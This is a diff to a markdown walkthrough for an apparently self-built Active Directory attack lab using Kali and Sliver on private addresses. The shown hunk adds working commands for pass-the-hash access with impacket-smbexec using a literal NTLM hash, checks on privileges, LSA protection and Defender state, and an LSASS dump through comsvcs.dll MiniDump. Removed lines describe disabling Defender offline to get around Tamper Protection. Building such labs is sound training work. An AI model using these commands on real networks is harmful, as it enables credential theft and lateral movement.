@@ -7,7 +7,7 @@ commands that must run on the **host machine** (not inside Kali — Docker is no
 - `[HOST]` — your host terminal (outside any container) — use for `docker logs`, `docker exec`, `make`
 - `[KALI]` — Kali attacker container (`make shell` or `docker exec -it dragonrx_kali /bin/bash`)
 - `[WEB01]` — shell on Ubuntu web server (192.168.10.100), obtained in Phase 1
-- `[WS01]` — Windows 10 psexec session (192.168.10.50)
+- `[WS01]` — Windows 10 smbexec SYSTEM session (192.168.10.50)
 - `[DC01]` — Windows Server 2019 Domain Controller (192.168.10.10)
 - `[C2]` — Sliver console (`docker exec -it dragonrx_c2 sliver`) — run from `[HOST]`
 
@@ -964,25 +964,29 @@ credentials if WDigest is re-enabled. Run this after Phase 5.1 (you need a shell
 
 > Run this after you have a SYSTEM shell on WS01 from Phase 5.1 (`impacket-smbexec`).
 
-```bash
+```
+[KALI] — open SYSTEM shell on WS01
+impacket-smbexec -hashes ':3e2883cab3222750f8c5766bd8f559d7' 'NOVATECH/Administrator@192.168.10.50'
+```
+
+```
 [WS01 — smbexec SYSTEM session]
+# Verify SeDebugPrivilege is enabled (required for comsvcs MiniDump)
+powershell -ep bypass -c "(whoami /priv) -match 'SeDebugPrivilege'"
+
+# Verify RunAsPPL is off (empty = 0 = PPL not enabled — dump will succeed)
+powershell -ep bypass -c "(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa).RunAsPPL"
+
+# Verify Defender real-time protection is off (disabled offline by deploy script)
+powershell -ep bypass -c "(Get-MpComputerStatus).RealTimeProtectionEnabled"
+# Expected: False — if True, re-run: sudo bash scripts/disable_defender_offline.sh on host
+
 # C:\Temp is pre-created by Ansible provisioning
 dir C:\Temp\
 
-# Windows Defender on Windows 10 22H2 blocks comsvcs.dll MiniDump with "Access is denied"
-# even from SYSTEM. Tamper Protection blocks ALL in-OS disable methods: Set-MpPreference,
-# registry writes via WinRM (even from SYSTEM), and safe-mode WinRM (NTLM stack not loaded).
-# The lab disables Defender OFFLINE during 'make up' by editing the WS01 VMDK SOFTWARE hive
-# directly via qemu-nbd+hivexregedit — Tamper Protection cannot enforce when the OS is off.
-# Verify before the dump:
-powershell -ep bypass -c "(Get-MpComputerStatus).RealTimeProtectionEnabled"
-# Expected: False — if True, run 'make reset && make up' on the host to re-apply the fix.
-
-# Dump LSASS using comsvcs.dll MiniDump via PowerShell one-liner.
-# Must be a single command: smbexec runs each line in a separate cmd.exe process,
-# so environment variables (set LPID=...) and for /f loops don't persist between commands.
-# PowerShell resolves the PID and triggers MiniDump in one shot.
-# -ep bypass: skip execution policy check   Start-Sleep 3: MiniDump writes asynchronously
+# Dump LSASS via comsvcs.dll MiniDump — single PowerShell one-liner is required because
+# smbexec spawns a fresh cmd.exe per command, so %LPID% env vars don't persist between lines.
+# -ep bypass: skip execution policy   Start-Sleep 3: MiniDump writes asynchronously
 powershell -ep bypass -c "$id=(Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $id C:\Temp\lsass.dmp full; Start-Sleep 3"
 
 # Confirm dump created (should be 30-80 MB)
